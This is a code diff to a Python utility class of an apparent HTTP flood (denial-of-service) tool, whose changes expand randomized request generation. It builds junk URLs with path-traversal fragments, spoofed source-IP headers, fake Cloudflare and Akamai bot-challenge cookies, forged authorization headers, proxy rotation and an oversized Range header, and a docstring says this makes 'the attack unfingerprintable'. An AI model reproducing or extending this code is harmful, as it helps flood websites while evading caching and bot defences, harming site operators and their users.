@@ -111,7 +111,7 @@ class utils():
         ]
 
         self.cache_controls = ['no-cache', 'max-age=0', 'no-store', 'no-transform', 'only-if-cached', 'must-revalidate', 'no-transform'] if not Core.bypass_cache else ['no-store', 'no-cache', 'no-transform']
-        self.accept_encodings = ['*', 'identity', 'gzip', 'deflate', 'compress', 'br']
+        self.encodings = ['identity', 'gzip', 'deflate', 'compress', 'br']
         self.accept_langs = ["*", "af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
         self.content_types = ['multipart/form-data', 'application/x-url-encoded']
         self.accepts = ['text/plain', '*/*', '/', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*', 'image/jpeg', 'application/x-ms-application', 'image/gif', 'application/xaml+xml', 'image/pjpeg', 'application/x-ms-xbap', 'application/x-shockwave-flash', 'application/msword']
@@ -141,16 +141,16 @@ class utils():
 
         return "".join([f'\\x{choice("0123456789ABCDEF")}{choice("0123456789ABCDEF")}' for _ in range(size)])
 
-    def get_proxy(self, force_give=False) -> str:
+    def get_proxy(self, is_requests=True, force_give=False) -> str:
         '''
         Gets a random proxy from the "proxy_file" variable that was defined by the user
         '''
 
         if force_give and Core.proxy_pool != None or len(Core.proxy_pool) > 0:
-            proxy = f'{Core.proxy_proto.lower()}h://{choice(Core.proxy_pool)}'
+            proxy = f'{Core.proxy_proto.lower()}://{choice(Core.proxy_pool)}'
         else: proxy = None
 
-        return {'http': proxy, 'https': proxy}
+        return {'http': proxy, 'https': proxy} if is_requests else proxy
 
     def tor_gateway(self) -> str:
         '''
@@ -187,7 +187,7 @@ class utils():
         
         return ''.join(choice(chars) for _ in range(strlen))
     
-    def buildblock(self, url) -> str:
+    def buildblock(self, url, include=True) -> str:
         '''
         Function to generate a block of junk, that gets added to the target url
         '''
@@ -199,7 +199,7 @@ class utils():
 
             block += self.randstr(randint(2, 8))
             for _ in range(randint(2, 10)):
-                rand = randint(0, 3)
+                rand = randrange(3)
                 if rand == 0: block += f'/{self.randstr(randint(5, 10))}'
                 elif rand == 1: block += choice(['/..','\\..','%2F..','%5C..']) # magik
                 else: block += f'/{choice(keywords).replace(" ","/")}'
@@ -207,13 +207,13 @@ class utils():
             block += f'?{quote(choice(keywords))}={self.randstr(randint(5, 10))}'
 
             for _ in range(randint(2, 9)):
-                if randint(0, 1) == 1: block += f'&{self.randstr(randint(5, 10))}={quote(choice(keywords))}'
+                if randrange(2) == 1: block += f'&{self.randstr(randint(5, 10))}={quote(choice(keywords))}'
                 else: block += f'&{quote(choice(keywords))}={quote(choice(keywords))}'
 
-            if randint(0, 2) == 0:
-                block += f'#{quote(choice(keywords))}'
+            if randrange(2) == 0:
+                block += f'#{quote(choice(keywords))}' # fragment
 
-            return url+block
+            return url+block if include else block
         else:
             return url
         
@@ -223,7 +223,7 @@ class utils():
         '''
 
         prefix = 'bytes=0-'
-        for i in range(randint(1300, 1700)): # cant make it too big
+        for i in range(randint(1300, 1500)):
             prefix += f',5-{str(i)}'
         
         return prefix
@@ -312,7 +312,7 @@ class utils():
             f'PHPSESSID={self.randstr(giveint())}; csrftoken={self.randstr(giveint())}; _gat={str(giveint())}',
             f'cf_chl_2={self.randstr(giveint())}; cf_chl_prog=x11; cf_clearance={self.randstr(giveint())}',
             f'__cf_bm={self.randstr(giveint())}; __cf_bm={self.randstr(giveint())}',
-            f'language=en; AKA_A2={self.randstr(giveint())}; AMCVS_3AE7BD6E597F48940A495ED0%40AdobeOrg={str(giveint())}; AMCV_{self.randstr(giveint())}={self.randstr(giveint())}; ak_bmsc={self.randstr(giveint(), chars="QWERTYUIOPASDFGHJKLZXCVBNM")}~{self.randstr(giveint())}'
+            f'language=en; AKA_A2={self.randstr(giveint())}; {self.randstr(giveint())}={str(giveint())}; AMCV_{self.randstr(giveint())}={self.randstr(giveint())}; ak_bmsc={self.randstr(giveint(), chars="QWERTYUIOPASDFGHJKLZXCVBNM")}~{self.randstr(giveint())}'
         ])
 
         # add a expiration date to the cookie
@@ -324,19 +324,17 @@ class utils():
         
     def buildheaders(self, url, if_socket=False) -> dict:
         '''
-        Function to generate randomized headers
+        Function to generate randomized headers, which in result makes the attack unfingerprintable
         '''
 
         # we shuffle em
-        for toshuffle in [self.cache_controls, self.accept_encodings, self.content_types, self.accepts]:
+        for toshuffle in [self.cache_controls, self.encodings, self.content_types, self.accepts]:
             shuffle(toshuffle)
         
+        parsed = urlparse(url)
 
         headers = choice([ # chooses between XMLHttpRequest and a random/predefined useragent
-            {'User-Agent': urllib3.util.SKIP_HEADER, 'X-Requested-With': 'XMLHttpRequest'},  # SKIP_HEADER makes urllib3 ignore the header, this basically removes the User-Agent header from the list
-            {'User-Agent': getAgent()}
-        ] if not if_socket else [ # if we send it over a socket, we can just strip the User-Agent header
-            {'X-Requested-With': 'XMLHttpRequest'},
+            {'User-Agent': urllib3.util.SKIP_HEADER, 'X-Requested-With': 'XMLHttpRequest'} if not if_socket else {'X-Requested-With': 'XMLHttpRequest'},  # SKIP_HEADER makes urllib3 ignore the header, this basically removes the User-Agent header from the list
             {'User-Agent': getAgent()}
         ])
 
@@ -348,11 +346,12 @@ class utils():
 
         headers.update({ # default headers
             'Cache-Control': ', '.join([ choice(self.cache_controls) for _ in range( randint(1, 3) ) ]),
-            'Accept-Encoding': ', '.join([ choice(self.accept_encodings) for _ in range( randint(1, 3) ) ]),
+            'Accept-Encoding': ', '.join([ choice(self.encodings) for _ in range( randint(1, 3) ) ]),
             'Accept': ', '.join([ choice(self.accepts) for _ in range( randint(1, 3) ) ]),
             'Accept-Language':  ', '.join([ choice(self.accept_langs) for _ in range( randint(1, 3) ) ]),
         })
-        
+
+        if randrange(2) == 1: headers.update({'Content-Encoding': choice(self.encodings)})
         if randrange(2) == 1:
             headers.update({
                 'Sec-Fetch-Dest': 'document',
@@ -362,11 +361,24 @@ class utils():
                 'Sec-Gpc': '1'
             })
 
-        if randrange(2) == 1: headers.update({'Upgrade-Insecure-Requests': '1'})        
-        if randrange(2) == 1: headers.update({'Referer': self.buildblock(getReferer())})        
+        if randrange(2) == 1: headers.update({'Referer': self.buildblock(getReferer())}) # adds a referer
+        if randrange(3) == 1: headers.update({'Origin': url})
+        if randrange(2) == 1: headers.update({'Upgrade-Insecure-Requests': '1'}) # upgrade insecure requests to https
+
+        proxychoice = randrange(3) # chooses a random "proxy" header
+        if proxychoice == 0: headers.update({choice(['Via','Client-IP','Real-IP']): ', '.join([ self.randip() for _ in range( randint(1, 3) ) ]) }) # fakes the source ip
+        elif proxychoice == 1: headers.update({'X-Forwarded-For': ', '.join([ self.randip() for _ in range( randint(1, 3) ) ])})
+        else: pass
+
+        if randrange(2) == 1: headers.update({'DNT': '1'}) # do-not-track
         if randrange(2) == 1: headers.update({'Cookie': self.buildcookie()}) # adds a fake cookie
-        if randrange(2) == 1: headers.update({choice(['Via','Client-IP','X-Forwarded-For','Real-IP']): self.randip() }) # fakes the source ip
-        if randrange(2) == 1: headers.update({'DNT': '1'})
+
+        authchoice = randrange(5) # pick a random authentication header and append it to the dictionary
+        if authchoice == 0: headers.update({'Proxy-Authorization': f'Basic {self.randstr(randint(5,10))}='}) # proxy authentication
+        elif authchoice == 1: headers.update({'Authorization': f'Basic {self.randstr(randint(5,10))}='}) # basic authentication
+        elif authchoice == 2: headers.update({'Authorization': f'Digest username={choice(keywords).replace(" ","_")}, realm="http-auth@{parsed.netloc}", uri="{self.buildblock(url, False)}", algorithm={choice(["MD5","SHA-256","SHA-512"])}, nonce="{self.randstr(randint(20,40))}", nc={str(randint(1,1000))}, cnonce="{self.randstr(randint(20,40))}", qop="{choice(["auth","auth-int","auth, auth-int"])}", response="{self.randstr(randint(20,40))}", opaque="{self.randstr(randint(20,40))}"'}) # digest authentication
+        else: pass
+
         if Core.random_headers: headers.update(choice(Core.random_headers))
         
         return headers
@@ -380,7 +392,7 @@ class utils():
             if os.name == 'nt': os.system('cls')
             else: os.system('clear')
         except:
-            print('\n'*400)
+            print('\n'*400) # backup method
 
     def make_id(self) -> str:
         '''
@@ -474,4 +486,5 @@ S*S.    S*S.    S*S    S%S  S*S    S*S  S*S.    S*S    S%S  S*S.     .S*S    .S*
  SSSbs   SSSbs  S*S    S&S  S*S SSSSP    SSSbs  S*S    S&S   SSSbs_sdSSS   sSS*S   
   YSSP    YSSP  S*S    SSS  S*S  SSY      YSSP  S*S    SSS    YSSP~YSSY    YSS'    
                 SP          SP                  SP > Created by  https://github.com/Nexuzzzz                                
-                Y           Y                   Y  > Licensed under the MIT license''')
+                Y           Y                   Y  > Licensed under the MIT license
+''')
